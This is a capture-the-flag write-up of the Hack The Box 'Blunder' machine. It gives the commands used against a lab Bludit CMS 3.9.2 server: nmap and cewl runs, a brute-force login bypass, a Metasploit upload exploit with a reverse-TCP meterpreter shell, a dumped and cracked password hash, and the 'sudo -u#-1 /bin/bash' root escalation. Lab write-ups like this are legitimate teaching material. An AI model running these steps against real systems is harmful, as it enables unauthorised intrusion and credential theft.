---
layout: single
title: "Hack The Box Write-up #4 : Blunder"
excerpt: "Writeup for Blunder, a machine provided by HacktheBox."
date: 2020-10-17
toc: true
toc_sticky: true
header:
  tagline: "Writeup for Blunder , a machine provided by HacktheBox."
  overlay_image: /assets/images/background.jpg
  overlay_filter: 0.5
  actions:
    - label: "Learn More"
      url: "https://www.hackthebox.eu/home/machines/profile/254"
  teaser: /assets/images/blunder-writeup/blunder.png
  teaser_home_page: true
  
categories:
  - hackthebox
tags:  
  - linux
  - cve
  - bludit-cms
---

![Card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/blunder.png)

## Summary

Blunder is an easy rated linux machine provided by hackthebox where are mainly represented with some Bludit CMS CVEs.
We use an Authentication Bypass through bruteforcing CVE to login on the admin dashboard. Later on we use yet another CVE (Arbitrary File Upload through images)
to grab a shell on the machine. A newer version of Bludit is configured in the machine where we find a hash for a system user which we crack later.
A sudo misconfiguration easily drops root shell.

## Enumeration
As always I start with a nmap scan to grab the initial information :
### nmap

```
root@kali:/home/suljot# nmap -sC -A 10.10.10.191
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-17 16:28 CEST
Nmap scan report for 10.10.10.191
Host is up (0.070s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   72.10 ms 10.10.14.1
2   72.03 ms 10.10.10.191
```
Port 21 seems closed so it obviously would be useless for now which leaves port 80 the only vector to gain more information.

### Website

![website](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/blunder-web.png)

Represented with a simple blog webpage which doesnt tell much useful information for the box.

Viewing the source of the webpage reveals things that could be useful : 

```html
<!-- Dynamic title tag -->
<title>Blunder | A blunder of interesting facts</title>

<!-- Dynamic description tag -->
<meta name="description" content="HackTheBox">

<!-- Include Favicon -->
<link rel="shortcut icon" href="http://10.10.10.191/bl-themes/blogx/img/favicon.png" type="image/png">

<!-- Include Bootstrap CSS file bootstrap.css -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">

<!-- Include CSS Styles from this theme -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2">

<!-- Load Plugins: Site head -->

<!-- Robots plugin -->
</head>
<body>
```

The webpage seems to be running under **Bludit CMS** and the revealed version seems to be **3.9.2**

Upon googling the found information I found an interesting **CVE** under this version of **Bludit** : [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

The above exploit needs at least the username parameter in order to do bruteforcing and yet we dont have any.

### Directory Fuzzing

I decided to start fuzzing the webpage for any possible leftovers or interesting files

![fuzzing](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/directory-bf.png)

After some time I find 2 interesting leads :
- /admin

![admin](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/bl-admin.png)

- /todo.txt

![todo](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/todo.png)

## Initial Foothold

I finally have an username (**fergus**) provided from the todo leftover and the login page. 
This way I can take a look on the exploit now.

### bruteforcing

I firstly created a wordlist using **cewl** based on the blog provided from the port 80 :

```sh
root@kali:~# cewl http://10.10.10.191 -w wordlist.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:~# ls -la wordlist.txt
-rw-r--r-- 1 root root 2498 Oct 17 16:48 wordlist.txt
```

I then copied the script in the previous blog localy and changed the parameters to my needs :

![exploit](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/exploit.png)

Running the exploit I get some correct credentials after a while :

![bf](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/bf.png)

``fergus:RolandDeschain``

Obviously I can use those creds to login on ``/admin`` and access the dashboard :

![dashboard](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/dashboard.png)

While searching for a possible vulnerability previously I also found [CVE-2019-16113](http://cve.circl.lu/cve/CVE-2019-16113),

Another vulnerability (remote command execution) for the **Bludit 3.9.2** version.

I'm going to use metasploit to do that to speed things up, but I recommed doing this one exploit manually as it learned me a few new tricks.

```console
msf5 > use exploit/linux/http/bludit_upload_images_exec
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST tun0
```
### www-data shell
After running the exploit we grab a low-privileged shell to the machine :

![www-data](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/metasploit.png)

Using the shell I just grabbed from the exploit I started to look for possible interesting paths on the machine.

There seems to be a newer version of Bludit (**3.10**) already installed on the machine but not yet set up on the blog.

Navigating on it I grabbed a very useful hash from **users.php**

```php
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

## User Escalation

Hugo, the user which the hash corresponds to, appears to be a system user as well.

Using [https://md5decrypt.net/](https://md5decrypt.net/) I was able to crack the hash : **faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120**

![user](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/user.png)

With a user shell already , I can easily grab the user flag under home folder.

## Upgrading Privileges

I quickly began to do the usual enumeration to find more information on how to grab root access.

### sudo
```sh
hugo@blunder:~$ sudo -l 
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$
```
From the above information seems like **hugo** is  configured to run sudo commands as anyone except root.

This configuration reminds me of an old sudo CVE where we could use something like : ``sudo -u#-1 /bin/bash`` to drop ourselves a root shell.

### root shell
I attempted the same exploit on the machine to see if  I could get any results :

![root-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/root-shell.png)

And with that being the last part of the writeup , We just owned root and can easily grab the root flag!
